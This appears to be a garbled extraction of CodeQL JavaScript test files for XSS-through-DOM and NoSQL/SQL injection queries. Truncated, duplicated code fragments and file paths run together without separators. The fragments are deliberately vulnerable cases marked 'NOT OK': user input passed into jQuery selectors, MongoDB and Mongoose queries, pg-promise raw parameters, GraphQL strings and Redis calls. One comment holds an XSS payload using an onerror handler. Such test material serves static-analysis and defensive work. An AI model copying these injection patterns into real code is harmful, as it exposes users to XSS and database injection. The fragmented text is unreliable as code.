o)this.o$.extend({}, o)var t = ... target;t = this.o.targetthis.o.targetconsole.log(t);console.log(t)$(t);$(t)f(options);f(options){\n\t\tvar ... / OK\n\t}if (saf ... arget);safe.has(target)safe.has{\n\t\topt ... T OK\n\t}options ... tions);options ... ptions){\n\t\t\tme ... in'\n\t\t}menu: '<div></div>'<div></div>target: '.my_plugin'.my_plugin$(options.menu);$(options.menu)options.menu$.fn.my ... in'\n\t};$.fn.my ... gin'\n\t}$.fn.my ... efaults{\n\t\tmen ... gin'\n\t}pluginN ... plugin"$.fn[pl ...  OK\n\t};$.fn[pl ... T OK\n\t}{\n\t\t$(o ... T OK\n\t}$.exten ... \t}\n\t});$.exten ... \t\t}\n\t}){\n\t\tmy_ ... \n\t\t}\n\t}my_plug ...  OK\n\t\t}$.fn.af ...  OK\n\t};$.fn.af ... T OK\n\t}$.fn.affix$.fn.to ...  OK\n\t};$.fn.to ... T OK\n\t}$.fn.tooltip$(optio ... ector);$(optio ... lector)options ... electoroptions.viewport$.fn.my ... uery\n\t}functio ... uery\n\t}{\n\t\tlet ... uery\n\t}let int ... /div>`;intenti ... </div>`options ... </div>``<div>hello</div>`$(intentional1);$(intentional1)$(intentional2);$(intentional2)`<div>` ... </div>``<div>``</div>`$(intentional3);$(intentional3)let uni ... /div>`;uninten ... </div>``<div c ... </div>`$(unintentional);$(unintentional)$.fn.my ... NCY]\n\t}functio ... NCY]\n\t}{\n\t\tlet ... NCY]\n\t}let tar ... target;target  ... arget);target  ... target)DEFAULTS.target$(docum ... target)$(document).findoptions ... arget);options ... target)options ... .targetoptions ... get.a);options ... rget.a)options.targets.aoptions.targets$(options.target.a)options.target.a$(docum ... rget.a){\n\t\t$(a ... \t\t}\n\n\t}$(anyPr ... arget);$(anyPr ... target)anyPref ... .target$(somet ... rget));$(somet ... arget))somethi ... target)something.replace%PLACEHOLDER%if (tar ... ng)\n\t\t}target.foo{\n\t\t\t$( ... ng)\n\t\t}functio ...  o.f\n\t}{\n\t\t$.f ...  o.f\n\t}$.fn.my_plugin = o.fo.fsetupPl ... K\n\t}});setupPl ... OK\n\t}}){f: fun ...  OK\n\t}}f: func ... T OK\n\t}{f:func ...  OK\n\t}}f:funct ... / OK\n\t}{\n\t\t$(d ... / OK\n\t}$(docum ... arget);/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/XssThroughDom/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/XssThroughDom/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/XssThroughDom/forms.js initialize the hook// init ... he hook { test: "test-input", test1: "test1-input" }// { te ... nput" }FormikwithFormikuseFormikContext'formik'FormikBasicinitialValuesemailonSubmitsetSubmitting
            handleSubmitFormikEnhancedmapPropsToValuesMyFormsubmitForm'react-final-form'Appstooge'larry'employedsubmittingpristine"text""stooge"
      plainSubmitplainReactonChangehandleChange"submit""Submit"useForm'react-hook-form'HookFormerrorsHookForm2getValues"button"onClickvanillaJS"form.myform"import  ... ormik';formikconst F ... div>\n);FormikB ... /div>\n)() => ( ... /div>\n)(\n    < ... /div>\n)<div>\n  ...  </div><Formik ... Formik>initial ... : '' }}{ email ... d: '' }email: ''password: ''validat ...      }}values  ...       }$("#id" ... s.foo);$("#id" ... es.foo)values.fooonSubmi ...      }}(values ...       }{ setSubmitting }$("#id" ... s.bar);$("#id" ... es.bar)values.bar\n            (inputs ...       )(\n      ...       )<form o ... </form>onSubmi ... Submit}const F ... yForm);FormikE ... MyForm)withFor ... MyForm)withFor ...    }\n}){\n    m ...     }\n}mapProp ... : '' })() => ({ name: '' })({ name: '' }){ name: '' }name: ''validat ... K\n    }values  ... K\n    }$("#id" ... email);$("#id" ... .email)values.emailhandleS ... K\n    }(values ... K\n    }(functi ...  OK \n})functio ... / OK \n}{\n    c ... / OK \n}const { ... text();{ value ... ntext(){ value ... tForm }useFormikContext()submitForm.emailimport  ... l-form'react-final-formconst A ...   />\n);App = ( ... \n  />\n)() => ( ... \n  />\n)(\n  <Fo ... \n  />\n)<Form\n  ... )}\n  />onSubmi ... \n    }}async v ... K\n    }$("#id" ... tooge);$("#id" ... stooge)values.stoogeinitial ... alse }}{ stoog ... false }stooge: 'larry'larryemployed: falserender= ... \n    )}({ hand ... >\n    ){ handl ... alues }(\n      ... >\n    )<input  ... /input>type="text"name="stooge"\n      $("#id" ... value);$("#id" ... .value)e.target.valuee.targetconst p ... form>\n)plainRe ... form>\n)() => ( ... form>\n)(\n    < ... form>\n)onSubmi ... mit(e)}e => plainSubmit(e)plainSubmit(e)<input  ... nge} />value={ ... .value}this.state.valueonChang ... Change}this.handleChange<input  ... mit" />type="submit"value="Submit"Submitimport  ... -form';react-hook-formfunctio ... \n  );\n}{\n  con ... \n  );\n}const { ... Form();{ regis ... eForm(){ regis ... rrors }useForm()const o ... K \n  };onSubmi ... OK \n  }(data)  ... OK \n  }{\n    $ ... OK \n  }$("#id" ... .name);$("#id" ... a.name)data.namereturn  ... m>\n  );(\n    < ... rm>\n  )onSubmi ... ubmit)}handleS ... Submit)<input  ...  })} />name="name"ref={re ... rue })}registe ... true }){ required: true }required: true{ regis ... alues }<form>\n ... </form><input  ... ter} />ref={register}<button ... button>type="button"onClick ...      }}() => { ...       }const v ... lues();values = getValues()getValues()$("#id" ... s.name)values.namedocumen ...     });documen ... \n    })documen ... yform")form.myformmyforme => {\n ... K\n    }documen ... K\n    }documen ... nsubmit/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/XssThroughDom/xss-through-dom.js NOT OK.	// NOT OK.\t OK - only repeats existing XSS. 	// OK - ...  XSS. \t NOT OK. 	// NOT OK. \t overloaded function. // over ... ction.  OK - this is for a flow-step to catch, not this query.// OK - ...  query. NOT OK. Attack: `<mytag id="id" src="x:&quot;&gt;&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;" />`// NOT  ... t;" />`"textarea"".some-element""data-target"'div1''data-target'safe1safe2"object""<p>""</p>"'text'"input""id""option""value"valMethodmyValuemy_formmy_input'#foo''innerText'anser"anser""section h1""nav ul""<a href='#"/ /g/[^\w-]+/g"'>Section</a>"".bla"SuperSub"<a src=\"""\">foo</a>"(functi ... .\n\t}\n})functio ... K.\n\t}\n}{\n\t$("# ... K.\n\t}\n}$("#id" ... val());$("#id" ... .val())$("textarea").val()$("textarea").val$("textarea")textarea$("#id" ... ext());$("#id" ... text())$(".som ... .text()$(".som ... ").text$(".some-element").some-elementsome-element$("#id" ... bar"));$("#id" ... "bar"))$(".som ...  "bar")$(".som ... ").attr$("#id" ... ar"}));$("#id" ... bar"}))$(".som ... "bar"}){"foo": "bar"}"foo": "bar"$("#id" ... get"));$("#id" ... rget"))$(".som ... arget")data-target$("#id" ... K.\t\n\t);$("#id" ... OK.\t\n\t)documen ... nerText$("#id" ... . \t\n\t);$("#id" ... S. \t\n\t)$("#id" ... K. \t\n\t)documen ... Contentdocumen ... ].valuedocumen ... ea")[0]documen ... tarea")documen ... ctorAll$("#id" ...  OK\n\t);$("#id" ... T OK\n\t)documen ... arget')documen ... tributedocumen ... 'div1')div1functio ... \t\t \t\n\t}{ // ov ... \t\t \t\n\t}if (x.j ...  OK\n\t\t}x.jquery{\n\t\t\tva ...  OK\n\t\t}var foo = $(x);foo = $(x)safe1($ ... val());safe1($ ... .val())functio ... \t} \t\n\t}{ // ov ... \t} \t\n\t}typeof  ... object"typeof xsafe2($ ... val());safe2($ ... .val())$("#id" ... ry.\n\t);$("#id" ... ery.\n\t)$("<p>" ... .text()$("<p>" ... ").text$("<p>" ... "</p>")"<p>" + ...  "</p>""<p>" + something()<p></p>$("#id" ... .val();$("#id" ... ).val()$("#id" ... nerHTML$("#id").get(0)$("#id").getvar base = $("#id");base = $("#id")base[ht ... val());base[ht ... .val())base[ht ... 'text']html ?  ...  'text'$("#id" ... ).name;$("#id" ... 0).name$("inpu ... 0).name$("input").get(0)$("input").get$("input")$("#id" ... name");$("#id" ... "name")$("inpu ... "name")$("inpu ... tribute$("#id" ... ("id");$("#id" ... e("id")$("inpu ... e("id")$("#id" ... alue");$("#id" ... value")$(docum ... value")$(docum ... ").attr$(docum ... ption")var val ... ").val;valMeth ... a").val$("#id" ... thod();$("#id" ... ethod()valMethod()var myV ... alue");myValue ... value")if(myVa ...  OK.\n\t}myValue.property{\n\t\t$(" ...  OK.\n\t}$("#id" ... yValue;$("#id" ... myValue$.jGrow ... .name);$.jGrow ... ).name)let sel ... ).name;selecto ... 0).nameif (som ... '\n    }{\n      ... '\n    }selecto ... l || ''$("text ... l || ''$(selector);$(selector)$(docum ... value);$(docum ... .value)documen ... t.valuedocumen ... y_inputdocument.my_form$("#id" ... xt') );$("#id" ... ext') )$('#foo ... rText')$('#foo').prop$('#foo')const a ... nser");anser = ... anser")require("anser")const t ... text();text =  ... .text()$("text").text()$("text").text$("text")$("#id" ... text));$("#id" ... (text))anser.a ... l(text)anser.ansiToHtmlnew ans ... s(text)new anser().processnew anser()$("sect ... OK\n\t});$("sect ...  OK\n\t})$("section h1").each$("section h1")section h1$("nav  ... </a>");$("nav  ... n</a>")$("nav ul").append$("nav ul")nav ul"<a hre ... on</a>""<a hre ... +/g,'')<a href='#$(this) ... +/g,'')$(this) ... replace$(this) ... g, '-')$(this) ... rCase()$(this) ... werCase$(this).text()$(this).text$(this)[^\w-]+[^\w-]'>Section</a>$("#foo ... ].value$("#foo ... la")[0]$("#foo ... ".bla")$("#foo").find.blafor (va ...  OK.\n\t}i < foo.lengthfoo.lengthvar i = 0$("#foo ... la")[i]class S ... );\n\t}\n}constru ... (0);\n\t}() {\n\t\t ... (0);\n\t}{\n\t\tthi ... (0);\n\t}this.el ... get(0);this.el ... .get(0)this.elclass S ... >`\n\t}\n}constru ...  />`\n\t}() {\n\t\t ...  />`\n\t}{\n\t\tsup ...  />`\n\t}super();super()$("#id" ... o</a>";$("#id" ... oo</a>""<a src ... oo</a>""<a src ... .el.src<a src="this.el.src">foo</a>/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/typed/shim.d.ts/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/typed/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089declare ... ;\n  }\n}interfa ... ny;\n  }find(qu ... ): any;/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/typed/tsconfig.json{\n  "in ... e\n  }\n}["."]{\n    " ... rue\n  }esModuleInteropcompilerOptions/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/typed/typedClient.tsbodyParserimport  ... ngodb";* as mongodbconst e ... as any;express ...  as anyrequire ...  as anyrequire("express")const b ... as any;bodyPar ...  as anyrequire ... arser")declare ... ection;mongodb.Collectionapp.use ... son());app.use ... json())bodyParser.json()bodyParser.jsonlet v = ... ody.x);v = JSO ... body.x)JSON.pa ... body.x)req.body.xgetColl ... : v });getColl ... d: v })getCollection().findgetCollection(){ id: v }id: vimport  ... goose";* as mongoosedeclare ... .Model;mongoose.Modeldeclare ... .Query;mongoose.QuerygetMong ... : v });getMong ... d: v })getMong ... ().findgetMongooseModel()getMongooseQuery()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/dbo.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untypeddbClientMongoClientDB_URLDB_NAMElet dbC ... = null;dbClien ... oClientrequire ... oClientrequire("mongodb")db = nullmodule. ... \n  }\n};module. ... ;\n  }\n}{\n  db: ... ;\n  }\n}db: ()  ... db;\n  }() => { ... db;\n  }{\n    return db;\n  }return db;connect ... });\n  }fn => { ... });\n  }{\n    d ... });\n  }dbClien ...     });dbClien ... \n    })dbClient.connectprocess.env.DB_URLprocess.env(err, c ... ;\n    }db = cl ... _NAME);db = cl ... B_NAME)client. ... B_NAME)client.dbprocess.env.DB_NAMEreturn fn(err);fn(err)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/graphql.jsOctokit"@octokit/core"kit'/post/:id'graphql
      query {
        repository(owner: "github", name: "") {
          object(expression: "master:foo") {
            ... on Blob {
              text
            }
          }
        }
      }
    withCustomRequest"@octokit/graphql"'/user/:id/'foo myGraphqlwithDefaults"@octokit/request"'/article/:id/'"POST /graphql"authorization"token 0000000000000000000000000000000000000001"Core"@octokit/rest"kit2'/event/:id/'result2nativeGraphqlbuildSchema'graphql'schema
  type Query {
    hello: String
  }
hello'Hello world!''/thing/:id'"{ foo"" }""https://my-grpahql-server.com/graphql""POST"{
        thing {
          name
          url
          
        }
      }{
        thing {
          name
          url
          $id
        }
      }'@actions/github'getOctokitimport  ... /core";@octokit/coreconst k ... okit();kit = new Octokit()new Octokit()app.get ... `);\n});app.get ...  `);\n})/post/:idfunctio ...   `);\n}{\n    c ...   `);\n}const i ... ams.id;id = req.params.idconst r ...     `);respons ... \n    `)kit.gra ... \n    `)kit.graphql`\n      ... }\n    `\n       ... name: "") {\n   ...  }\n    import  ... aphql";@octokit/graphql/user/:id/const r ... {id}`);respons ... ${id}`)graphql(`foo ${id}`)`foo ${id}`const m ... quest);myGraph ... equest)withCus ... equest)myGraph ... ${id}`)const w ... ts({});withDef ... lts({})graphql.defaults({})graphql.defaultswithDef ... {id}`);withDef ... ${id}`)const { ... uest");{ reque ... quest"){ request }require ... quest")@octokit/request/article/:id/async f ... OT OK\n}const r ...     });result  ... \n    })await r ... \n    })request ... \n    })POST /graphqlheaders ...       }authori ... 000001""token  ... 000001"token 0000000000000000000000000000000000000001query: `foo ${id}`request.defaults({})request.defaultswithDef ... d}` });withDef ... id}` }){ query ... {id}` }import  ... /rest";@octokit/restOctokit as Coreconst k ... Core();kit2 = new Core()new Core()/event/:id/result  ... ${id}`)await k ... ${id}`)kit2.gr ... ${id}`)kit2.graphqlconst r ... d}` });result2 ... id}` })await k ... id}` })kit2.re ... id}` })kit2.requestimport  ... aphql';graphql ... Graphqlvar sch ...   }\n`);schema  ... \n  }\n`)buildSc ... \n  }\n`)`\n  typ ... g\n  }\n`\n  type ... ng\n  }\nvar roo ...   },\n};root =  ... \n  },\n}{\n  hel ... \n  },\n}hello:  ... !';\n  }() => { ... !';\n  }{\n    r ... !';\n  }return  ... orld!';Hello world!/thing/:idasync f ... \n  })\n}{\n  con ... \n  })\n}const i ... ery.id;id = req.query.idreq.query.idconst r ...  root);result  ... , root)await n ... , root)nativeG ... , root)"{ foo" + id + " }""{ foo" + id{ foo }fetch(" ... })\n  })"https: ... raphql"https://my-grpahql-server.com/graphqlhttps://my-grpahql-servercom/graphql{\n    m ...  })\n  }method: "POST"POSTheaders ... "\n    }"Conten ... n/json"body: J ... \n    })JSON.st ... \n    }){\n      ... `\n    }query:  ...      }``{\n     ...      }`{\n      ...        \n        }\n      }variabl ...       }id: idconst g ... thub');github  ... ithub')require ... ithub')@actions/githubconst k ... ("foo")kit = g ... ("foo")github. ... ("foo")github.getOctokitkit.gra ... ${id}`)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/json-schema-validator.js NOT OK - validate() doesn't sanitize// NOT  ... anitize OK - but still flagged [INCONSISTENCY]'mongodb''string'checkSchema'/documents/find''mongodb://localhost:27017/test''doc'Joi'joi''date''title''/documents/insert'validateAsyncimport  ... ngodb';const s ...   },\n};schema  ...    },\n}{\n    t ...    },\n}propert ... ,\n    }{\n      ... ,\n    }date: { ... ring' }{ type: 'string' }type: 'string'title:  ... ring' }const a ...  Ajv();const c ... chema);checkSc ... schema)ajv.compile(schema)ajv.compilefunctio ... null;\n}{\n    r ... null;\n}return x != null;x != null/documents/find{\n    M ...   });\n}MongoCl ...     });MongoCl ... \n    })MongoClient.connect'mongod ... 7/test'mongodb://localhost:27017/test(err, d ... K\n    }let doc ... 'doc');doc = d ... ('doc')db.collection('doc')db.collectionconst q ... .data);query = ... y.data)JSON.pa ... y.data)if (che ...       }checkSchema(query)doc.find(query);doc.find(query)doc.findif (ajv ...       }ajv.val ...  query)if (val ...       }validate(query)import  ...  'joi';const j ... itle');joiSche ... title')Joi.obj ... title')Joi.obj ... }).withJoi.obj ... ed()\n})Joi.object{\n    d ... red()\n}date: J ... uired()Joi.str ... uired()Joi.str ... equiredJoi.string()Joi.stringtitle:  ... uired()/documents/insertasync ( ... }\n    }const v ... query);validat ... (query)joiSche ... (query)if (!va ...       }!validate.errorvalidate.errortry {\n  ...       }await j ... query);await j ... (query)joiSche ... teAsynccatch ( ...       }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/marsdb-flow-from.jsMarsDB"marsdb"myDoc"myDoc"const M ... rsdb");MarsDB  ... arsdb")require("marsdb")marsdbconst m ... yDoc");myDoc = ... myDoc")new Mar ... myDoc")MarsDB.Collectionconst d ... yDoc\n};db = {\n  myDoc\n}{\n  myDoc\n}module.exports = db;module.exports = db/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/marsdb-flow-to.js NOT OK: query is tainted by user-provided object value// NOT  ... t value'./marsdb-flow-from'urlencodedextended"/documents/find"const e ... from');express ... press")bodyPar ... arser")db = re ... -from')require ... -from')./marsdb-flow-from/marsdb-flow-fromapp.use ... ue }));app.use ... rue }))bodyPar ... true })bodyPar ... encoded{ extended: true }extended: trueapp.pos ... y);\n});app.pos ... ry);\n})(req, r ... ery);\n}{\n  con ... ery);\n}const query = {};query = {}query.t ... .title;query.t ... y.titlequery.titlereq.body.titledb.myDo ... query);db.myDoc.find(query)db.myDoc.finddb.myDoc/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/marsdb.jsconst e ... rser");let doc ... yDoc");doc = n ... myDoc")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/minimongo.jsminimongo"minimongo"LocalDbMemoryDbmyDocsminimon ... mongo")require("minimongo")var Loc ... myDocs;LocalDb ... emoryDbminimongo.MemoryDbdb = new LocalDb()new LocalDb()doc = db.myDocsdb.myDocs/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/mongodb.js OK: user-data is coerced to a string// OK:  ...  string OK: throws unless user-data is a string OK: input checked to be a string NOT OK: input is parsed as JSON after string check// NOT  ... g check OK: query is tainted, but only by string value// OK:  ... g value'body-parser''/:id'"MASTER""/logs/count-by-tag""logs"tagsimportedDbo"./dbo.js"useParamsuseQueryqueriesconst e ... rser');mongodb ... ngodb')require('mongodb')bodyPar ... arser')const M ... Client;MongoCl ... oClientmongodb.MongoClient(err, d ... }\n    }doc.fin ... tle });doc.fin ... itle }){ title ... title }title:  ... y.title'' + qu ... y.titlequery.body.titlequery.bodydoc.fin ... (1) });doc.fin ... r(1) }){ title ... tr(1) }title:  ... bstr(1)query.b ... bstr(1)query.b ... .substrlet tit ... .title;title = ... y.titleif (typ ...       }typeof title{ title: title }title: titledoc.fin ... le) });doc.fin ... tle) }){ title ... itle) }title:  ... (title)JSON.parse(title)/:id{\n    l ...   });\n}let que ... m.id };query = ... am.id }{ id: req.param.id }id: req.param.idreq.param.id(err, d ... ;\n    }req.query.titleapp.pos ... \t});\n})(req, r ... \n\t});\n}{\n\tcons ... \n\t});\n}MongoCl ... );\n\t});MongoCl ... y);\n\t})(err, c ... ry);\n\t}{\n\t\tlet ... ry);\n\t}doc = c ... ('doc')client. ... ('doc')client. ... lectionclient.db("MASTER")MASTER/logs/count-by-tag(req, r ... g });\n}{\n  let ... g });\n}let tag ... ry.tag;tag = req.query.tagreq.query.tagMongoCl ... ;\n  });MongoCl ... );\n  })(err, c ... });\n  }{\n    c ... });\n  }client\n ... tag });client\n ...  tag })client\n ...  .countclient\n ... "logs")client\n ... lectionclient\n ... B_NAME)client\n      .dblogs{ tags: tag }tags: taglet imp ... o.js");importe ... bo.js")require("./dbo.js")./dbo.js/dboimporte ... tag });importe ...  tag })importe ...  .countimporte ... "logs")importe ... lectionimporte ...   .db()importedDbo\n    .dbapp.get ... m);\n});app.get ... am);\n})(req, r ... ram);\n}{\n  use ... ram);\n}usePara ... param);useParams(req.param)let que ... s.id };query = ... ms.id }{ id: params.id }id: params.id(err, d ... y);\n  }{\n    l ... y);\n  }{\n  use ... ery);\n}useQuery(req.query);useQuery(req.query){\n  con ...   });\n}query.t ... s.titlequeries.title/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/mongodb_bodySafe.js OK: req.body is safe// OK:  ... is safe NOT OK: regardless of body parser, query value is still tainted// NOT  ... taintedapp.use ... se }));app.use ... lse }))bodyPar ... alse }){ extended: false }extended: false/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/mongoose.js NOT OK - `.where()` on a Model. // NOT  ... Model.  NOT OK - `.where()` on a Query. // NOT  ... Query.  OK (invalid program)// OK ( ... rogram) OK (res is a number)// OK ( ... number) To detect if API-graphs were used incorrectly.// To d ... rectly.'use strict'ExpressBodyParserMongoose'mongoose''mongodb://localhost/injectable1''Document'aggregatedeleteManydeleteOnedistinct'type'findOnefindOneAndDeletefindOneAndRemovefindOneAndUpdatereplaceOneupdateManyupdateOnefindByIdAndUpdatewhereorcommentmodels"constant"getQueryConstructorgeoSearchfindById_id$eq'use strict';use strictconst E ... ress');Express ... press')const B ... rser');BodyPar ... arser')const M ... oose');Mongoos ... goose')require('mongoose')Mongoos ... romise;Mongoos ... PromiseMongoose.Promiseglobal.PromiseMongoos ... ble1');Mongoos ... able1')Mongoose.connect'mongod ... table1'mongodb://localhost/injectable1app = Express()Express()BodyParser.json()BodyParser.jsonconst D ... ing\n});Documen ... ring\n})Mongoos ... ring\n})Mongoose.model{\n    t ... tring\n}title:  ... e\n    }{\n      ... e\n    }type: Stringunique: trueapp.pos ... / OK\n}){\n    c ... // OK\n}Documen ... uery]);Documen ... query])Document.aggregate[query]Documen ... query);Documen ... (query)Document.countDocument.deleteManyDocument.deleteOneDocumen ...  query)Document.distinctDocument.find(query)Document.findDocument.findOneDocumen ... dDeleteDocumen ... dRemoveDocumen ... dUpdateDocument.replaceOneDocument.updateDocument.updateManyDocumen ... hen(X);Documen ... then(X)Documen ... y).thenDocument.updateOneDocumen ... n(){});Documen ... on(){})new Mon ... T OK\n\t;new Mon ... on(){})new Mon ... \n\t\t.andnew Mon ...  query)Mongoose.QueryDocumen ... ec()\n\t;Documen ... .exec()Documen ... \t\t.execDocumen ... \t.countDocumen ... commentDocumen ... istinctDocumen ... K\n\t\t.orDocumen ... \n\t\t.andDocumen ...  .whereDocument.whereMongoos ... query);Mongoos ... (query)Mongoos ... ).countMongoos ... tion(X)Mongoos ... nectionMongoos ... odel(Y)Mongoos ... ).modelMongoos ... ].countMongoos ... dels[Y]Mongoos ... .modelsDocumen ... uery));Documen ... query))(err, r ... (query)res.count(query)res.counterr.count(query)err.countDocumen ... X).execDocument.findOne(X)Documen ... X).then(res) = ... (query)(err) = ... (query)res[i].count(query)res[i].countres[i]Document.find(X)functio ... t");\n\t}{ // To ... t");\n\t}return  ... tant");new Mon ... stant")constantnew inn ... query);new inn ...  query)functio ... ery;\n\t}{\n\t\tret ... ery;\n\t}return  ... .Query;var C = ... ctor();C = get ... uctor()getQuer ... uctor()new C(X, Y, query);new C(X, Y, query)Documen ... ) { });Documen ... () { })function () { }let id  ... y.cond;cond =  ... ry.condreq.query.condDocumen ... (cond);Documen ... y(cond)Documen ... e(cond)Documen ... h(cond)Document.geoSearchDocument.removeDocumen ... nd, Y);Documen ... ond, Y)Document.find(cond);Document.find(cond)Documen ... Id(id);Documen ... yId(id)Document.findByIdDocumen ...  id });Documen ... : id }){ _id: id }_id: idDocumen ... d } });Documen ... id } }){ _id: { $eq: id } }_id: { $eq: id }{ $eq: id }$eq: id/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/mongooseJsonParse.jsapp.get ... y);\n});app.get ... ry);\n}){\n    c ... ery);\n}query.t ... ).titleJSON.pa ... ).title/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/mongooseModel.jsMyModel'MyModel'getSchemaimport  ... goose';export  ... ema());const M ... ema());MyModel ... hema())mongoos ... hema())mongoose.modelgetSchema()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/mongooseModelClient.js'./mongooseModel''/find'import  ... Model';./mongooseModel/mongooseModelimport  ... arser';MyModel ... : v });MyModel ... d: v })MyModel.findMyModel ... .id });MyModel ... y.id }){ id: req.body.id }id: req.body.idreq.body.idMyModel ... d}` });MyModel ... id}` }){ id: ` ... .id}` }id: `${req.body.id}``${req.body.id}`/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/pg-promise-types.tsIDatabase"pg-promise"onRequestimport  ... omise";pg-promiseexport  ... ;\n  }\n}class F ... ;\n  }\n}db: IDatabase;onReque ... ();\n  }{\n    l ... ();\n  }let tai ... rams.x;taint = req.params.xthis.db.one(taint);this.db.one(taint)this.db.onethis.dbres.end();require ...  res));require ... , res))require ... )().get(req, r ... q, res)new Foo ... q, res)new Foo().onRequestnew Foo()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/pg-promise.js NOT OK - interpreted as raw parameter// NOT  ... rameter OK - not using raw interpolation// OK - ... olation OK - :value cannot break out of single quotes// OK - ...  quotes NOT OK - enclosed by wrong type of quote// NOT  ... f quotepgp'pg-promise''DB_CONNECTION_STRING'"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='"category"' ORDER BY PRICE"manymanyOrNonemultimultiResultnoneoneOrNone'SELECT * FROM news where id = $1''SELECT * FROM news where id = $1:raw''SELECT * FROM news where id = $1^''SELECT * FROM news where id = $1:raw AND name = $2:raw AND foo = $3''SELECT * FROM news where id = ${id}:raw AND name = ${name}'"SELECT * FROM news where id = ${id}:value AND name LIKE '%${name}:value%' AND title LIKE \"%${title}:value%\""taskcndconst p ... se')();pgp = r ... ise')()require ... ise')()require ... omise')require ...  );\n});require ...   );\n})(req, r ... \n  );\n}const d ... ING']);db = pg ... RING'])pgp(pro ... RING'])process ... TRING']'DB_CON ... STRING'DB_CONNECTION_STRINGvar que ... PRICE";query = ...  PRICE""SELECT ...  PRICE""SELECT ... ategory"SELECT ... GORY='"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='req.params.category' ORDER BY PRICEdb.any(query);db.any(query)db.anydb.many(query);db.many(query)db.manydb.many ... query);db.manyOrNone(query)db.manyOrNonedb.map(query);db.map(query)db.mapdb.multi(query);db.multi(query)db.multidb.mult ... query);db.mult ... (query)db.multiResultdb.none(query);db.none(query)db.nonedb.one(query);db.one(query)db.onedb.oneOrNone(query);db.oneOrNone(query)db.oneOrNonedb.query(query);db.query(query)db.querydb.result(query);db.result(query)db.resultdb.one( ... K\n  });db.one( ... OK\n  })text: querytext: ' ... d = $1''SELECT ... d = $1'SELECT * FROM news where id = $1SELECT FROM news where id = values: ... rams.iddb.one( ... r\n  });db.one( ... er\n  }){\n    t ... ter\n  }text: ' ... $1:raw''SELECT ... $1:raw'SELECT * FROM news where id = $1:raw1:rawtext: ' ...  = $1^''SELECT ...  = $1^'SELECT * FROM news where id = $1^db.one( ... ]\n  });db.one( ...  ]\n  }){\n    t ...   ]\n  }text: ' ... o = $3''SELECT ... o = $3'SELECT * FROM news where id = $1:raw AND name = $2:raw AND foo = $31:raw AND name = 2:raw AND foo = values: ... n\n    ][\n      ... n\n    ]req.params.foodb.one( ... }\n  });db.one( ...  }\n  }){\n    t ...   }\n  }text: ' ... {name}''SELECT ... {name}'SELECT * FROM news where id = ${id}:raw AND name = ${name}values: ... n\n    }{\n      ... n\n    }name: r ... ms.nametext: " ... lue%\"""SELECT ... lue%\""SELECT * FROM news where id = ${id}:value AND name LIKE '%${name}:value%' AND title LIKE "%${title}:value%"values: ... e\n    }title:  ... s.titlereq.params.titledb.task ... K\n  });db.task ... OK\n  })db.taskt => {\n ...  OK\n  }{\n      ...  OK\n  }return t.one(query);t.one(query)t.onedb.task ... OK\n  );db.task ...  OK\n  ){ cnd:  ... uery) }cnd: t  ... (query)t => t.one(query)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-089/untyped/redis.js chain commands// chain commandsredis"redis""key"hmset"field""value2"repliesnewClientsetAsyncfoo1foo2unrelatedfoo3foo4const r ... edis");redis = ... redis")require("redis")const c ... ient();client  ... lient()redis.createClient()redis.createClientrequire ... .json()require ... ').jsonclient. ... alue");client. ... value")client.setreq.body.keyvar key ... dy.key;key = req.body.keyif (typ ... ;\n    }typeof keyclient. ... lue"]);client. ... alue"])["key", "value"]client. ... lue2");client. ... alue2")client.hmsetfieldclient\n ... ) { });client\n ... s) { })client\n ...   .execclient\n ... et(key)client\n ...    .getclient\n ... value")client\n ...    .setclient\n ... multi()client\n ...  .multifunctio ... es) { }client. ...     });client. ... \n    })client.duplicate(err, n ... K\n    }newClie ... alue");newClie ... value")newClient.setclient. ... e().setclient.duplicate()import  